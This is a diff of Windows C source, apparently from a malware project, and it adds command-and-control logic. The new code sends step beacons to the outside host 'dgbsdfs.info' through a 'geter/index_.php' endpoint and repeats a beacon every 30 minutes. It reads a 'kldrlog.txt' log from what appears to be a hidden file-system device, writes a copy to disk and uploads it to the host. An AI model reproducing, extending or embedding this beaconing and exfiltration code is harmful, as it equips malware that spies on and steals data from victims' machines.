@@ -12,9 +12,10 @@ char URL[1024], URL2[1024];
 
 const char* HOST = "dgbsdfs.info";
 #ifdef RELEASEDLL
-	char *URLFormat = "geter/index_.php?cmd=step&uid=%s&step=161%%5Fdp";
+	char* UrlStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
 #else
-	char *URLFormat = "geter/index_.php?cmd=step&uid=%s&step=161%%5Fdp";
+	char* UrlCmdStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
+	char* UrlCmdStorefile2 = "geter/index_.php?cmd=storefile2&uid=%s";
 #endif
 
 extern LPTSTR CreateFsDeviceName(VOID);
@@ -70,9 +71,39 @@ bool UploadFile( const char* host, const char* url, const char* name, const char
 	return ret;
 }
 
+void SendCmdStep( int num )
+{
+	char userAgent[512];
+	DWORD szUserAgent = sizeof(userAgent);
+	bool ret = false;
+	ObtainUserAgentString( 0, userAgent, &szUserAgent );
+	HINTERNET inet = InternetOpenA( userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, 0, 0 );
+	if( inet )
+	{
+		HINTERNET connect = InternetConnectA( inet, HOST, INTERNET_DEFAULT_HTTP_PORT, NULL,NULL, INTERNET_SERVICE_HTTP, 0, 1u );
+		if( connect )
+		{
+			wsprintfA( URL, UrlCmdStep, UID, num );
+			HINTERNET request = HttpOpenRequestA( connect, 0, URL, NULL, NULL, 0, 0, 1 ); 
+			if( request )
+			{
+				BOOL res = HttpSendRequestA( request, 0, 0, 0, 0 );        
+				InternetCloseHandle(request);
+			}
+		}
+		InternetCloseHandle(connect);
+	}
+	InternetCloseHandle(inet);
+}
+
 DWORD WINAPI PingerProc(LPVOID)
 {
-
+	while( true )
+	{
+		SendCmdStep(164);
+		Sleep(1000 * 60 * 30);
+	}
+/*
 	GetTempPathA(MAX_PATH, tempFolder);
 	GetTempFileNameA(tempFolder, NULL, TRUE, fileName);
 
@@ -86,9 +117,17 @@ DWORD WINAPI PingerProc(LPVOID)
 		Sleep(1000 * 60 * 30);
 	}
 //	FreeLibrary(urlmon);
+*/
 	return 0;
 }
 
+void WriteAllBytes( const char* nameFile, char* data, int sz )
+{
+ HANDLE file = CreateFileA( nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
+ DWORD wr;
+ WriteFile( file, data, sz, &wr, 0 );
+ CloseHandle(file);
+}
 
 #ifdef RELEASEDLL
 // Работаем в библиотеке
@@ -107,19 +146,27 @@ BOOL APIENTRY MyMain( HMODULE hModule,
 #else
 	int APIENTRY MyMain() 
 	{
+		Sleep(60 * 1000);
+		SendCmdStep(161);
 		BOOL FsPresent = FALSE;
 		if (CreateFsDeviceName())
 			FsPresent = IsFsPresent();
-		wsprintfA( URL, URLFormat, UID );
-		Sleep(60 * 1000);
 		if( FsPresent )
 		{
+			SendCmdStep(162);
 			char* data;
 			int c_data;
 			CmdCopy( "kldrlog.txt", &data, c_data );
+			WriteAllBytes( "c:\\kldrlog.txt", data, c_data );
+			wsprintfA( URL, UrlCmdStorefile2, UID );
 			UploadFile( HOST, URL, "rep", "log.txt", data, c_data, "HDPHDMMOHSGN" );
+			SendCmdStep(163);
 		}
 		return PingerProc(NULL);
 	}
 
 #endif
+
+void main()
+{
+}
